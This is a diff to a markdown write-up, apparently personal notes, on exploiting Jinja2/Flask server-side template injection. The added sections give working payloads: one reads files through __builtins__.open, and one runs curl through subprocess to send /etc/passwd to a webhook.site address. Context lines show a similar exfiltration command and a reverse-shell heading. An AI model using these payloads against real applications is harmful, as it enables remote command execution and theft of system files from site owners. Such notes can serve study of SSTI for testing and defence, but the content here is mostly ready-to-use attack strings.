@@ -6,6 +6,12 @@
 
 Index sill be -1 of line number, so index of `<class 'urllib.request.Request'>` is 343
 
+## Using payload directly
+
+Since these are objects, to find index of an object I'll need to pass the object itself to search it. Which would defeat the purpose.
+
+I tried converting it to a list of stings `{{[str(i) for i in self.__class__.__base__.__subclasses__()]}}` which does not work, I think jinja 2 for loops work differently
+
 ![image](https://github.com/HACKER097/WebEx/assets/38581702/268b773c-9233-4f5a-a854-6b0a6ed21a72)
 
 # get name of current python flask script
@@ -34,6 +40,14 @@ So I used subprocess instead `self.__class__.__init__.__globals__.__builtins__._
 
 ![image](https://github.com/HACKER097/WebEx/assets/38581702/8f7663d6-c5f2-49e0-b0b3-b84e4c87e981)
 
+## Reading file without a shell
+
+subprocess might be blocked sometimes because its too lethal, lets try to do it without subprocess.
+
+`{{ self.__class__.__init__.__globals__.__builtins__.open("test.py").read() }}`
+
+Here I am using `open()` which can be found in `__builtins__` to read the file.
+
 # run a command
 
 Same as previous one. Just put the commands in `getoutput()`
@@ -50,7 +64,14 @@ I once again used a shell to do this, because it the easier way. This is the com
 curl http://0.0.0.0:8000/?c=$(cat /etc/passwd)
 ```
 
+Using actual webhook is very similar, just replace our url with the webhook url.
+
+`http://127.0.0.1:5000/?c={{self.__class__.__init__.__globals__.__builtins__.__import__(%27subprocess%27).getoutput(%27curl%20https://webhook.site/0d2e1b38-aa09-459f-ac71-f1374ae848ac/?c=$(cat%20/etc/passwd)%27)}}`
+
 ![image](https://github.com/HACKER097/WebEx/assets/38581702/e5f49d8c-cbff-4557-ab08-0ab510be0345)
+
+![image](https://github.com/HACKER097/WebEx/assets/38581702/6be0709d-60bd-4be2-952b-1d947e4308ec)
+
 
 # Create reverse shell
 
